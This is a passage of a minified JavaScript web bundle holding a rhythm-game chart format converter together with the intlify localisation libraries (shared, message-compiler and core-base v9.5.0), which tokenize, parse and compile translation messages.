d=chartConverter.parseRPE(r,e.name,s),u=await chart123(d.data),{messages:f,info:m,line:g}=d;return{type:"chart",name:e.name,md5:md5$1(r),data:u,msg:f,info:m,line:g,buffer:e.buffer}})}}catch{return new Promise(()=>{throw new Error("Just make it a promise")}).catch(async()=>{const l=chartConverter.parse(r,e.name),d=await chart123(l.data);return{type:"chart",name:e.name,md5:md5$1(r),data:d,msg:l.messages,buffer:e.buffer}})}}).catch(r=>({type:"error",name:e.name,data:r}))}function splitPath(e){const t=e.lastIndexOf("/"),n=e.slice(t+1),s=~t?e.slice(0,t):"";return{name:n,path:s}}function joinPathInfo(e,t){if(!t)return e;for(const n of e)n.Chart&&(n.Chart=`${t}/${n.Chart}`),n.Music&&(n.Music=`${t}/${n.Music}`),n.Image&&(n.Image=`${t}/${n.Image}`);return e}function chart123(e,t){const n=typeof t=="function"?JSON.parse(e,t):JSON.parse(e);if(n.formatVersion===void 0)throw new Error("Invalid chart file");switch(parseInt(n.formatVersion)){case 1:{n.formatVersion=3;for(const s of n.judgeLineList)for(const r of s.judgeLineMoveEvents)r.start2=r.start%1e3/520,r.end2=r.end%1e3/520,r.start=Math.floor(r.start/1e3)/880,r.end=Math.floor(r.end/1e3)/880}case 3:for(const s of n.judgeLineList){let r=0,o=0;for(const l of s.speedEvents)l.startTime<0&&(l.startTime=0),l.floorPosition=r,l.floorPosition2=o,r+=(l.endTime-l.startTime)/s.bpm*1.875*l.value,o+=Math.fround((l.endTime-l.startTime)/s.bpm*1.875)*l.value,r=Math.fround(r),o=Math.fround(o)}case 3473:for(const s of n.judgeLineList)if(s.numOfNotes==null){s.numOfNotes=0;for(const r of s.notesAbove)r.type===1&&s.numOfNotes++,r.type===2&&s.numOfNotes++,r.type===3&&s.numOfNotes++,r.type===4&&s.numOfNotes++;for(const r of s.notesBelow)r.type===1&&s.numOfNotes++,r.type===2&&s.numOfNotes++,r.type===3&&s.numOfNotes++,r.type===4&&s.numOfNotes++}if(n.numOfNotes==null){n.numOfNotes=0;for(const s of n.judgeLineList)n.numOfNotes+=s.numOfNotes}break;default:throw new Error(`Unsupported formatVersion: ${n.formatVersion}`)}return n}/*!
  * shared v9.5.0
  * (c) 2023 kazuya kawaguchi
  * Released under the MIT License.
  */const inBrowser=typeof window<"u",makeSymbol=(e,t=!1)=>t?Symbol.for(e):Symbol(e),generateFormatCacheKey=(e,t,n)=>friendlyJSONstringify({l:e,k:t,s:n}),friendlyJSONstringify=e=>JSON.stringify(e).replace(/\u2028/g,"\\u2028").replace(/\u2029/g,"\\u2029").replace(/\u0027/g,"\\u0027"),isNumber=e=>typeof e=="number"&&isFinite(e),isDate=e=>toTypeString(e)==="[object Date]",isRegExp=e=>toTypeString(e)==="[object RegExp]",isEmptyObject=e=>isPlainObject(e)&&Object.keys(e).length===0,assign$1=Object.assign;let _globalThis;const getGlobalThis=()=>_globalThis||(_globalThis=typeof globalThis<"u"?globalThis:typeof self<"u"?self:typeof window<"u"?window:typeof global<"u"?global:{});function escapeHtml(e){return e.replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&apos;")}const hasOwnProperty=Object.prototype.hasOwnProperty;function hasOwn(e,t){return hasOwnProperty.call(e,t)}const isArray=Array.isArray,isFunction=e=>typeof e=="function",isString$1=e=>typeof e=="string",isBoolean=e=>typeof e=="boolean",isObject$1=e=>e!==null&&typeof e=="object",objectToString=Object.prototype.toString,toTypeString=e=>objectToString.call(e),isPlainObject=e=>{if(!isObject$1(e))return!1;const t=Object.getPrototypeOf(e);return t===null||t.constructor===Object},toDisplayString=e=>e==null?"":isArray(e)||isPlainObject(e)&&e.toString===objectToString?JSON.stringify(e,null,2):String(e);function join$1(e,t=""){return e.reduce((n,s,r)=>r===0?n+s:n+t+s,"")}function incrementer(e){let t=e;return()=>++t}function warn(e,t){typeof console<"u"&&(console.warn("[intlify] "+e),t&&console.warn(t.stack))}/*!
  * message-compiler v9.5.0
  * (c) 2023 kazuya kawaguchi
  * Released under the MIT License.
  */function createPosition(e,t,n){return{line:e,column:t,offset:n}}function createLocation(e,t,n){const s={start:e,end:t};return n!=null&&(s.source=n),s}const RE_ARGS=/\{([0-9a-zA-Z]+)\}/g;function format$1(e,...t){return t.length===1&&isObject(t[0])&&(t=t[0]),(!t||!t.hasOwnProperty)&&(t={}),e.replace(RE_ARGS,(n,s)=>t.hasOwnProperty(s)?t[s]:"")}const assign=Object.assign,isString=e=>typeof e=="string",isObject=e=>e!==null&&typeof e=="object";function join(e,t=""){return e.reduce((n,s,r)=>r===0?n+s:n+t+s,"")}const CompileErrorCodes={EXPECTED_TOKEN:1,INVALID_TOKEN_IN_PLACEHOLDER:2,UNTERMINATED_SINGLE_QUOTE_IN_PLACEHOLDER:3,UNKNOWN_ESCAPE_SEQUENCE:4,INVALID_UNICODE_ESCAPE_SEQUENCE:5,UNBALANCED_CLOSING_BRACE:6,UNTERMINATED_CLOSING_BRACE:7,EMPTY_PLACEHOLDER:8,NOT_ALLOW_NEST_PLACEHOLDER:9,INVALID_LINKED_FORMAT:10,MUST_HAVE_MESSAGES_IN_PLURAL:11,UNEXPECTED_EMPTY_LINKED_MODIFIER:12,UNEXPECTED_EMPTY_LINKED_KEY:13,UNEXPECTED_LEXICAL_ANALYSIS:14,UNHANDLED_CODEGEN_NODE_TYPE:15,UNHANDLED_MINIFIER_NODE_TYPE:16,__EXTEND_POINT__:17},errorMessages={[CompileErrorCodes.EXPECTED_TOKEN]:"Expected token: '{0}'",[CompileErrorCodes.INVALID_TOKEN_IN_PLACEHOLDER]:"Invalid token in placeholder: '{0}'",[CompileErrorCodes.UNTERMINATED_SINGLE_QUOTE_IN_PLACEHOLDER]:"Unterminated single quote in placeholder",[CompileErrorCodes.UNKNOWN_ESCAPE_SEQUENCE]:"Unknown escape sequence: \\{0}",[CompileErrorCodes.INVALID_UNICODE_ESCAPE_SEQUENCE]:"Invalid unicode escape sequence: {0}",[CompileErrorCodes.UNBALANCED_CLOSING_BRACE]:"Unbalanced closing brace",[CompileErrorCodes.UNTERMINATED_CLOSING_BRACE]:"Unterminated closing brace",[CompileErrorCodes.EMPTY_PLACEHOLDER]:"Empty placeholder",[CompileErrorCodes.NOT_ALLOW_NEST_PLACEHOLDER]:"Not allowed nest placeholder",[CompileErrorCodes.INVALID_LINKED_FORMAT]:"Invalid linked format",[CompileErrorCodes.MUST_HAVE_MESSAGES_IN_PLURAL]:"Plural must have messages",[CompileErrorCodes.UNEXPECTED_EMPTY_LINKED_MODIFIER]:"Unexpected empty linked modifier",[CompileErrorCodes.UNEXPECTED_EMPTY_LINKED_KEY]:"Unexpected empty linked key",[CompileErrorCodes.UNEXPECTED_LEXICAL_ANALYSIS]:"Unexpected lexical analysis in token: '{0}'",[CompileErrorCodes.UNHANDLED_CODEGEN_NODE_TYPE]:"unhandled codegen node type: '{0}'",[CompileErrorCodes.UNHANDLED_MINIFIER_NODE_TYPE]:"unhandled mimifier node type: '{0}'"};function createCompileError(e,t,n={}){const{domain:s,messages:r,args:o}=n,l=format$1((r||errorMessages)[e]||"",...o||[]),d=new SyntaxError(String(l));return d.code=e,t&&(d.location=t),d.domain=s,d}function defaultOnError(e){throw e}const CHAR_SP=" ",CHAR_CR="\r",CHAR_LF=`
`,CHAR_LS=String.fromCharCode(8232),CHAR_PS=String.fromCharCode(8233);function createScanner(e){const t=e;let n=0,s=1,r=1,o=0;const l=I=>t[I]===CHAR_CR&&t[I+1]===CHAR_LF,d=I=>t[I]===CHAR_LF,u=I=>t[I]===CHAR_PS,f=I=>t[I]===CHAR_LS,m=I=>l(I)||d(I)||u(I)||f(I),g=()=>n,y=()=>s,v=()=>r,x=()=>o,E=I=>l(I)||u(I)||f(I)?CHAR_LF:t[I],S=()=>E(n),w=()=>E(n+o);function k(){return o=0,m(n)&&(s++,r=0),l(n)&&n++,n++,r++,t[n]}function C(){return l(n+o)&&o++,o++,t[n+o]}function R(){n=0,s=1,r=1,o=0}function L(I=0){o=I}function O(){const I=n+o;for(;I!==n;)k();o=0}return{index:g,line:y,column:v,peekOffset:x,charAt:E,currentChar:S,currentPeek:w,next:k,peek:C,reset:R,resetPeek:L,skipToPeek:O}}const EOF=void 0,DOT=".",LITERAL_DELIMITER="'",ERROR_DOMAIN$3="tokenizer";function createTokenizer(e,t={}){const n=t.location!==!1,s=createScanner(e),r=()=>s.index(),o=()=>createPosition(s.line(),s.column(),s.index()),l=o(),d=r(),u={currentType:14,offset:d,startLoc:l,endLoc:l,lastType:14,lastOffset:d,lastStartLoc:l,lastEndLoc:l,braceNest:0,inLinked:!1,text:""},f=()=>u,{onError:m}=t;function g(T,_,N,...P){const D=f();if(_.column+=N,_.offset+=N,m){const V=n?createLocation(D.startLoc,_):null,U=createCompileError(T,V,{domain:ERROR_DOMAIN$3,args:P});m(U)}}function y(T,_,N){T.endLoc=o(),T.currentType=_;const P={type:_};return n&&(P.loc=createLocation(T.startLoc,T.endLoc)),N!=null&&(P.value=N),P}const v=T=>y(T,14);function x(T,_){return T.currentChar()===_?(T.next(),_):(g(CompileErrorCodes.EXPECTED_TOKEN,o(),0,_),"")}function E(T){let _="";for(;T.currentPeek()===CHAR_SP||T.currentPeek()===CHAR_LF;)_+=T.currentPeek(),T.peek();return _}function S(T){const _=E(T);return T.skipToPeek(),_}function w(T){if(T===EOF)return!1;const _=T.charCodeAt(0);return _>=97&&_<=122||_>=65&&_<=90||_===95}function k(T){if(T===EOF)return!1;const _=T.charCodeAt(0);return _>=48&&_<=57}function C(T,_){const{currentType:N}=_;if(N!==2)return!1;E(T);const P=w(T.currentPeek());return T.resetPeek(),P}function R(T,_){const{currentType:N}=_;if(N!==2)return!1;E(T);const P=T.currentPeek()==="-"?T.peek():T.currentPeek(),D=k(P);return T.resetPeek(),D}function L(T,_){const{currentType:N}=_;if(N!==2)return!1;E(T);const P=T.currentPeek()===LITERAL_DELIMITER;return T.resetPeek(),P}function O(T,_){const{currentType:N}=_;if(N!==8)return!1;E(T);const P=T.currentPeek()===".";return T.resetPeek(),P}function I(T,_){const{currentType:N}=_;if(N!==9)return!1;E(T);const P=w(T.currentPeek());return T.resetPeek(),P}function A(T,_){const{currentType:N}=_;if(!(N===8||N===12))return!1;E(T);const P=T.currentPeek()===":";return T.resetPeek(),P}function j(T,_){const{currentType:N}=_;if(N!==10)return!1;const P=()=>{const V=T.currentPeek();return V==="{"?w(T.peek()):V==="@"||V==="%"||V==="|"||V===":"||V==="."||V===CHAR_SP||!V?!1:V===CHAR_LF?(T.peek(),P()):w(V)},D=P();return T.resetPeek(),D}function G(T){E(T);const _=T.currentPeek()==="|";return T.resetPeek(),_}function X(T){const _=E(T),N=T.currentPeek()==="%"&&T.peek()==="{";return T.resetPeek(),{isModulo:N,hasSpace:_.length>0}}function q(T,_=!0){const N=(D=!1,V="",U=!1)=>{const z=T.currentPeek();return z==="{"?V==="%"?!1:D:z==="@"||!z?V==="%"?!0:D:z==="%"?(T.peek(),N(D,"%",!0)):z==="|"?V==="%"||U?!0:!(V===CHAR_SP||V===CHAR_LF):z===CHAR_SP?(T.peek(),N(!0,CHAR_SP,U)):z===CHAR_LF?(T.peek(),N(!0,CHAR_LF,U)):!0},P=N();return _&&T.resetPeek(),P}function J(T,_){const N=T.currentChar();return N===EOF?EOF:_(N)?(T.next(),N):null}function K(T){return J(T,N=>{const P=N.charCodeAt(0);return P>=97&&P<=122||P>=65&&P<=90||P>=48&&P<=57||P===95||P===36})}function le(T){return J(T,N=>{const P=N.charCodeAt(0);return P>=48&&P<=57})}function se(T){return J(T,N=>{const P=N.charCodeAt(0);return P>=48&&P<=57||P>=65&&P<=70||P>=97&&P<=102})}function de(T){let _="",N="";for(;_=le(T);)N+=_;return N}function oe(T){S(T);const _=T.currentChar();return _!=="%"&&g(CompileErrorCodes.EXPECTED_TOKEN,o(),0,_),T.next(),"%"}function ge(T){let _="";for(;;){const N=T.currentChar();if(N==="{"||N==="}"||N==="@"||N==="|"||!N)break;if(N==="%")if(q(T))_+=N,T.next();else break;else if(N===CHAR_SP||N===CHAR_LF)if(q(T))_+=N,T.next();else{if(G(T))break;_+=N,T.next()}else _+=N,T.next()}return _}function ke(T){S(T);let _="",N="";for(;_=K(T);)N+=_;return T.currentChar()===EOF&&g(CompileErrorCodes.UNTERMINATED_CLOSING_BRACE,o(),0),N}function ye(T){S(T);let _="";return T.currentChar()==="-"?(T.next(),_+=`-${de(T)}`):_+=de(T),T.currentChar()===EOF&&g(CompileErrorCodes.UNTERMINATED_CLOSING_BRACE,o(),0),_}function he(T){S(T),x(T,"'");let _="",N="";const P=V=>V!==LITERAL_DELIMITER&&V!==CHAR_LF;for(;_=J(T,P);)_==="\\"?N+=Ce(T):N+=_;const D=T.currentChar();return D===CHAR_LF||D===EOF?(g(CompileErrorCodes.UNTERMINATED_SINGLE_QUOTE_IN_PLACEHOLDER,o(),0),D===CHAR_LF&&(T.next(),x(T,"'")),N):(x(T,"'"),N)}function Ce(T){const _=T.currentChar();switch(_){case"\\":case"'":return T.next(),`\\${_}`;case"u":return we(T,_,4);case"U":return we(T,_,6);default:return g(CompileErrorCodes.UNKNOWN_ESCAPE_SEQUENCE,o(),0,_),""}}function we(T,_,N){x(T,_);let P="";for(let D=0;D<N;D++){const V=se(T);if(!V){g(CompileErrorCodes.INVALID_UNICODE_ESCAPE_SEQUENCE,o(),0,`\\${_}${P}${T.currentChar()}`);break}P+=V}return`\\${_}${P}`}function $e(T){S(T);let _="",N="";const P=D=>D!=="{"&&D!=="}"&&D!==CHAR_SP&&D!==CHAR_LF;for(;_=J(T,P);)N+=_;return N}function me(T){let _="",N="";for(;_=K(T);)N+=_;return N}function W(T){const _=(N=!1,P)=>{const D=T.currentChar();return D==="{"||D==="%"||D==="@"||D==="|"||D==="("||D===")"||!D||D===CHAR_SP?P:D===CHAR_LF||D===DOT?(P+=D,T.next(),_(N,P)):(P+=D,T.next(),_(!0,P))};return _(!1,"")}function Q(T){S(T);const _=x(T,"|");return S(T),_}function Z(T,_){let N=null;switch(T.currentChar()){case"{":return _.braceNest>=1&&g(CompileErrorCodes.NOT_ALLOW_NEST_PLACEHOLDER,o(),0),T.next(),N=y(_,2,"{"),S(T),_.braceNest++,N;case"}":return _.braceNest>0&&_.currentType===2&&g(CompileErrorCodes.EMPTY_PLACEHOLDER,o(),0),T.next(),N=y(_,3,"}"),_.braceNest--,_.braceNest>0&&S(T),_.inLinked&&_.braceNest===0&&(_.inLinked=!1),N;case"@":return _.braceNest>0&&g(CompileErrorCodes.UNTERMINATED_CLOSING_BRACE,o(),0),N=ne(T,_)||v(_),_.braceNest=0,N;default:let D=!0,V=!0,U=!0;if(G(T))return _.braceNest>0&&g(CompileErrorCodes.UNTERMINATED_CLOSING_BRACE,o(),0),N=y(_,1,Q(T)),_.braceNest=0,_.inLinked=!1,N;if(_.braceNest>0&&(_.currentType===5||_.currentType===6||_.currentType===7))return g(CompileErrorCodes.UNTERMINATED_CLOSING_BRACE,o(),0),_.braceNest=0,fe(T,_);if(D=C(T,_))return N=y(_,5,ke(T)),S(T),N;if(V=R(T,_))return N=y(_,6,ye(T)),S(T),N;if(U=L(T,_))return N=y(_,7,he(T)),S(T),N;if(!D&&!V&&!U)return N=y(_,13,$e(T)),g(CompileErrorCodes.INVALID_TOKEN_IN_PLACEHOLDER,o(),0,N.value),S(T),N;break}return N}function ne(T,_){const{currentType:N}=_;let P=null;const D=T.currentChar();switch((N===8||N===9||N===12||N===10)&&(D===CHAR_LF||D===CHAR_SP)&&g(CompileErrorCodes.INVALID_LINKED_FORMAT,o(),0),D){case"@":return T.next(),P=y(_,8,"@"),_.inLinked=!0,P;case".":return S(T),T.next(),y(_,9,".");case":":return S(T),T.next(),y(_,10,":");default:return G(T)?(P=y(_,1,Q(T)),_.braceNest=0,_.inLinked=!1,P):O(T,_)||A(T,_)?(S(T),ne(T,_)):I(T,_)?(S(T),y(_,12,me(T))):j(T,_)?(S(T),D==="{"?Z(T,_)||P:y(_,11,W(T))):(N===8&&g(CompileErrorCodes.INVALID_LINKED_FORMAT,o(),0),_.braceNest=0,_.inLinked=!1,fe(T,_))}}function fe(T,_){let N={type:14};if(_.braceNest>0)return Z(T,_)||v(_);if(_.inLinked)return ne(T,_)||v(_);switch(T.currentChar()){case"{":return Z(T,_)||v(_);case"}":return g(CompileErrorCodes.UNBALANCED_CLOSING_BRACE,o(),0),T.next(),y(_,3,"}");case"@":return ne(T,_)||v(_);default:if(G(T))return N=y(_,1,Q(T)),_.braceNest=0,_.inLinked=!1,N;const{isModulo:D,hasSpace:V}=X(T);if(D)return V?y(_,0,ge(T)):y(_,4,oe(T));if(q(T))return y(_,0,ge(T));break}return N}function M(){const{currentType:T,offset:_,startLoc:N,endLoc:P}=u;return u.lastType=T,u.lastOffset=_,u.lastStartLoc=N,u.lastEndLoc=P,u.offset=r(),u.startLoc=o(),s.currentChar()===EOF?y(u,14):fe(s,u)}return{nextToken:M,currentOffset:r,currentPosition:o,context:f}}const ERROR_DOMAIN$2="parser",KNOWN_ESCAPES=/(?:\\\\|\\'|\\u([0-9a-fA-F]{4})|\\U([0-9a-fA-F]{6}))/g;function fromEscapeSequence(e,t,n){switch(e){case"\\\\":return"\\";case"\\'":return"'";default:{const s=parseInt(t||n,16);return s<=55295||s>=57344?String.fromCodePoint(s):"�"}}}function createParser(e={}){const t=e.location!==!1,{onError:n}=e;function s(w,k,C,R,...L){const O=w.currentPosition();if(O.offset+=R,O.column+=R,n){const I=t?createLocation(C,O):null,A=createCompileError(k,I,{domain:ERROR_DOMAIN$2,args:L});n(A)}}function r(w,k,C){const R={type:w};return t&&(R.start=k,R.end=k,R.loc={start:C,end:C}),R}function o(w,k,C,R){R&&(w.type=R),t&&(w.end=k,w.loc&&(w.loc.end=C))}function l(w,k){const C=w.context(),R=r(3,C.offset,C.startLoc);return R.value=k,o(R,w.currentOffset(),w.currentPosition()),R}function d(w,k){const C=w.context(),{lastOffset:R,lastStartLoc:L}=C,O=r(5,R,L);return O.index=parseInt(k,10),w.nextToken(),o(O,w.currentOffset(),w.currentPosition()),O}function u(w,k){const C=w.context(),{lastOffset:R,lastStartLoc:L}=C,O=r(4,R,L);return O.key=k,w.nextToken(),o(O,w.currentOffset(),w.currentPosition()),O}function f(w,k){const C=w.context(),{lastOffset:R,lastStartLoc:L}=C,O=r(9,R,L);return O.value=k.replace(KNOWN_ESCAPES,fromEscapeSequence),w.nextToken(),o(O,w.currentOffset(),w.currentPosition()),O}function m(w){const k=w.nextToken(),C=w.context(),{lastOffset:R,lastStartLoc:L}=C,O=r(8,R,L);return k.type!==12?(s(w,CompileErrorCodes.UNEXPECTED_EMPTY_LINKED_MODIFIER,C.lastStartLoc,0),O.value="",o(O,R,L),{nextConsumeToken:k,node:O}):(k.value==null&&s(w,CompileErrorCodes.UNEXPECTED_LEXICAL_ANALYSIS,C.lastStartLoc,0,getTokenCaption(k)),O.value=k.value||"",o(O,w.currentOffset(),w.currentPosition()),{node:O})}function g(w,k){const C=w.context(),R=r(7,C.offset,C.startLoc);return R.value=k,o(R,w.currentOffset(),w.currentPosition()),R}function y(w){const k=w.context(),C=r(6,k.offset,k.startLoc);let R=w.nextToken();if(R.type===9){const L=m(w);C.modifier=L.node,R=L.nextConsumeToken||w.nextToken()}switch(R.type!==10&&s(w,CompileErrorCodes.UNEXPECTED_LEXICAL_ANALYSIS,k.lastStartLoc,0,getTokenCaption(R)),R=w.nextToken(),R.type===2&&(R=w.nextToken()),R.type){case 11:R.value==null&&s(w,CompileErrorCodes.UNEXPECTED_LEXICAL_ANALYSIS,k.lastStartLoc,0,getTokenCaption(R)),C.key=g(w,R.value||"");break;case 5:R.value==null&&s(w,CompileErrorCodes.UNEXPECTED_LEXICAL_ANALYSIS,k.lastStartLoc,0,getTokenCaption(R)),C.key=u(w,R.value||"");break;case 6:R.value==null&&s(w,CompileErrorCodes.UNEXPECTED_LEXICAL_ANALYSIS,k.lastStartLoc,0,getTokenCaption(R)),C.key=d(w,R.value||"");break;case 7:R.value==null&&s(w,CompileErrorCodes.UNEXPECTED_LEXICAL_ANALYSIS,k.lastStartLoc,0,getTokenCaption(R)),C.key=f(w,R.value||"");break;default:s(w,CompileErrorCodes.UNEXPECTED_EMPTY_LINKED_KEY,k.lastStartLoc,0);const L=w.context(),O=r(7,L.offset,L.startLoc);return O.value="",o(O,L.offset,L.startLoc),C.key=O,o(C,L.offset,L.startLoc),{nextConsumeToken:R,node:C}}return o(C,w.currentOffset(),w.currentPosition()),{node:C}}function v(w){const k=w.context(),C=k.currentType===1?w.currentOffset():k.offset,R=k.currentType===1?k.endLoc:k.startLoc,L=r(2,C,R);L.items=[];let O=null;do{const j=O||w.nextToken();switch(O=null,j.type){case 0:j.value==null&&s(w,CompileErrorCodes.UNEXPECTED_LEXICAL_ANALYSIS,k.lastStartLoc,0,getTokenCaption(j)),L.items.push(l(w,j.value||""));break;case 6:j.value==null&&s(w,CompileErrorCodes.UNEXPECTED_LEXICAL_ANALYSIS,k.lastStartLoc,0,getTokenCaption(j)),L.items.push(d(w,j.value||""));break;case 5:j.value==null&&s(w,CompileErrorCodes.UNEXPECTED_LEXICAL_ANALYSIS,k.lastStartLoc,0,getTokenCaption(j)),L.items.push(u(w,j.value||""));break;case 7:j.value==null&&s(w,CompileErrorCodes.UNEXPECTED_LEXICAL_ANALYSIS,k.lastStartLoc,0,getTokenCaption(j)),L.items.push(f(w,j.value||""));break;case 8:const G=y(w);L.items.push(G.node),O=G.nextConsumeToken||null;break}}while(k.currentType!==14&&k.currentType!==1);const I=k.currentType===1?k.lastOffset:w.currentOffset(),A=k.currentType===1?k.lastEndLoc:w.currentPosition();return o(L,I,A),L}function x(w,k,C,R){const L=w.context();let O=R.items.length===0;const I=r(1,k,C);I.cases=[],I.cases.push(R);do{const A=v(w);O||(O=A.items.length===0),I.cases.push(A)}while(L.currentType!==14);return O&&s(w,CompileErrorCodes.MUST_HAVE_MESSAGES_IN_PLURAL,C,0),o(I,w.currentOffset(),w.currentPosition()),I}function E(w){const k=w.context(),{offset:C,startLoc:R}=k,L=v(w);return k.currentType===14?L:x(w,C,R,L)}function S(w){const k=createTokenizer(w,assign({},e)),C=k.context(),R=r(0,C.offset,C.startLoc);return t&&R.loc&&(R.loc.source=w),R.body=E(k),e.onCacheKey&&(R.cacheKey=e.onCacheKey(w)),C.currentType!==14&&s(k,CompileErrorCodes.UNEXPECTED_LEXICAL_ANALYSIS,C.lastStartLoc,0,w[C.offset]||""),o(R,k.currentOffset(),k.currentPosition()),R}return{parse:S}}function getTokenCaption(e){if(e.type===14)return"EOF";const t=(e.value||"").replace(/\r?\n/gu,"\\n");return t.length>10?t.slice(0,9)+"…":t}function createTransformer(e,t={}){const n={ast:e,helpers:new Set};return{context:()=>n,helper:o=>(n.helpers.add(o),o)}}function traverseNodes(e,t){for(let n=0;n<e.length;n++)traverseNode(e[n],t)}function traverseNode(e,t){switch(e.type){case 1:traverseNodes(e.cases,t),t.helper("plural");break;case 2:traverseNodes(e.items,t);break;case 6:traverseNode(e.key,t),t.helper("linked"),t.helper("type");break;case 5:t.helper("interpolate"),t.helper("list");break;case 4:t.helper("interpolate"),t.helper("named");break}}function transform(e,t={}){const n=createTransformer(e);n.helper("normalize"),e.body&&traverseNode(e.body,n);const s=n.context();e.helpers=Array.from(s.helpers)}function optimize(e){const t=e.body;return t.type===2?optimizeMessageNode(t):t.cases.forEach(n=>optimizeMessageNode(n)),e}function optimizeMessageNode(e){if(e.items.length===1){const t=e.items[0];(t.type===3||t.type===9)&&(e.static=t.value,delete t.value)}else{const t=[];for(let n=0;n<e.items.length;n++){const s=e.items[n];if(!(s.type===3||s.type===9)||s.value==null)break;t.push(s.value)}if(t.length===e.items.length){e.static=join(t);for(let n=0;n<e.items.length;n++){const s=e.items[n];(s.type===3||s.type===9)&&delete s.value}}}}const ERROR_DOMAIN$1="minifier";function minify(e){switch(e.t=e.type,e.type){case 0:const t=e;minify(t.body),t.b=t.body,delete t.body;break;case 1:const n=e,s=n.cases;for(let m=0;m<s.length;m++)minify(s[m]);n.c=s,delete n.cases;break;case 2:const r=e,o=r.items;for(let m=0;m<o.length;m++)minify(o[m]);r.i=o,delete r.items,r.static&&(r.s=r.static,delete r.static);break;case 3:case 9:case 8:case 7:const l=e;l.value&&(l.v=l.value,delete l.value);break;case 6:const d=e;minify(d.key),d.k=d.key,delete d.key,d.modifier&&(minify(d.modifier),d.m=d.modifier,delete d.modifier);break;case 5:const u=e;u.i=u.index,delete u.index;break;case 4:const f=e;f.k=f.key,delete f.key;break;default:throw createCompileError(CompileErrorCodes.UNHANDLED_MINIFIER_NODE_TYPE,null,{domain:ERROR_DOMAIN$1,args:[e.type]})}delete e.type}const ERROR_DOMAIN="parser";function createCodeGenerator(e,t){const{sourceMap:n,filename:s,breakLineCode:r,needIndent:o}=t,l=t.location!==!1,d={filename:s,code:"",column:1,line:1,offset:0,map:void 0,breakLineCode:r,needIndent:o,indentLevel:0};l&&e.loc&&(d.source=e.loc.source);const u=()=>d;function f(S,w){d.code+=S}function m(S,w=!0){const k=w?r:"";f(o?k+"  ".repeat(S):k)}function g(S=!0){const w=++d.indentLevel;S&&m(w)}function y(S=!0){const w=--d.indentLevel;S&&m(w)}function v(){m(d.indentLevel)}return{context:u,push:f,indent:g,deindent:y,newline:v,helper:S=>`_${S}`,needIndent:()=>d.needIndent}}function generateLinkedNode(e,t){const{helper:n}=e;e.push(`${n("linked")}(`),generateNode(e,t.key),t.modifier?(e.push(", "),generateNode(e,t.modifier),e.push(", _type")):e.push(", undefined, _type"),e.push(")")}function generateMessageNode(e,t){const{helper:n,needIndent:s}=e;e.push(`${n("normalize")}([`),e.indent(s());const r=t.items.length;for(let o=0;o<r&&(generateNode(e,t.items[o]),o!==r-1);o++)e.push(", ");e.deindent(s()),e.push("])")}function generatePluralNode(e,t){const{helper:n,needIndent:s}=e;if(t.cases.length>1){e.push(`${n("plural")}([`),e.indent(s());const r=t.cases.length;for(let o=0;o<r&&(generateNode(e,t.cases[o]),o!==r-1);o++)e.push(", ");e.deindent(s()),e.push("])")}}function generateResource(e,t){t.body?generateNode(e,t.body):e.push("null")}function generateNode(e,t){const{helper:n}=e;switch(t.type){case 0:generateResource(e,t);break;case 1:generatePluralNode(e,t);break;case 2:generateMessageNode(e,t);break;case 6:generateLinkedNode(e,t);break;case 8:e.push(JSON.stringify(t.value),t);break;case 7:e.push(JSON.stringify(t.value),t);break;case 5:e.push(`${n("interpolate")}(${n("list")}(${t.index}))`,t);break;case 4:e.push(`${n("interpolate")}(${n("named")}(${JSON.stringify(t.key)}))`,t);break;case 9:e.push(JSON.stringify(t.value),t);break;case 3:e.push(JSON.stringify(t.value),t);break;default:throw createCompileError(CompileErrorCodes.UNHANDLED_CODEGEN_NODE_TYPE,null,{domain:ERROR_DOMAIN,args:[t.type]})}}const generate=(e,t={})=>{const n=isString(t.mode)?t.mode:"normal",s=isString(t.filename)?t.filename:"message.intl",r=!!t.sourceMap,o=t.breakLineCode!=null?t.breakLineCode:n==="arrow"?";":`
`,l=t.needIndent?t.needIndent:n!=="arrow",d=e.helpers||[],u=createCodeGenerator(e,{mode:n,filename:s,sourceMap:r,breakLineCode:o,needIndent:l});u.push(n==="normal"?"function __msg__ (ctx) {":"(ctx) => {"),u.indent(l),d.length>0&&(u.push(`const { ${join(d.map(g=>`${g}: _${g}`),", ")} } = ctx`),u.newline()),u.push("return "),generateNode(u,e),u.deindent(l),u.push("}"),delete e.helpers;const{code:f,map:m}=u.context();return{ast:e,code:f,map:m?m.toJSON():void 0}};function baseCompile$1(e,t={}){const n=assign({},t),s=!!n.jit,r=!!n.minify,o=n.optimize==null?!0:n.optimize,d=createParser(n).parse(e);return s?(o&&optimize(d),r&&minify(d),{ast:d,code:""}):(transform(d,n),generate(d,n))}/*!
  * core-base v9.5.0
  * (c) 2023 kazuya kawaguchi
  * Released under the MIT License.
  */function initFeatureFlags$1(){typeof __INTLIFY_PROD_DEVTOOLS__!="boolean"&&(getGlobalThis().__INTLIFY_PROD_DEVTOOLS__=!1),typeof __INTLIFY_JIT_COMPILATION__!="boolean"&&(getGlobalThis().__INTLIFY_JIT_COMPILATION__=!1),typeof __INTLIFY_DROP_MESSAGE_COMPILER__!="boolean"&&(getGlobalThis().__INTLIFY_DROP_MESSAGE_COMPILER__=!1)}const pathStateMachine=[];pathStateMachine[0]={w:[0],i:[3,0],"[":[4],o:[7]};pathStateMachine[1]={w:[1],".":[2],"[":[4],o:[7]};pathStateMachine[2]={w:[2],i:[3,0],0:[3,0]};pathStateMachine[3]={i:[3,0],0:[3,0],w:[1,1],".":[2,1],"[":[4,1],o:[7,1]};pathStateMachine[4]={"'":[5,0],'"':[6,0],"[":[4,2],"]":[1,3],o:8,l:[4,0]};pathStateMachine[5]={"'":[4,0],o:8,l:[5,0]};pathStateMachine[6]={'"':[4,0],o:8,l:[6,0]};const literalValueRE=/^\s?(?:true|false|-?[\d.]+|'[^']*'|"[^"]*")\s?$/;function isLiteral(e){return literalValueRE.test(e)}function stripQuotes(e){const t=e.charCodeAt(0),n=e.charCodeAt(e.length-1);return t===n&&(t===34||t===39)?e.slice(1,-1):e}function getPathCharType(e){if(e==null)return"o";switch(e.charCodeAt(0)){case 91:case 93:case 46:case 34:case 39:return e;case 95:case 36:case 45:return"i";case 9:case 10:case 13:case 160:case 65279:case 8232:case 8233:return"w"}return"i"}function formatSubPath(e){const t=e.trim();return e.charAt(0)==="0"&&isNaN(parseInt(e))?!1:isLiteral(t)?stripQuotes(t):"*"+t}function parse(e){const t=[];let n=-1,s=0,r=0,o,l,d,u,f,m,g;const y=[];y[0]=()=>{l===void 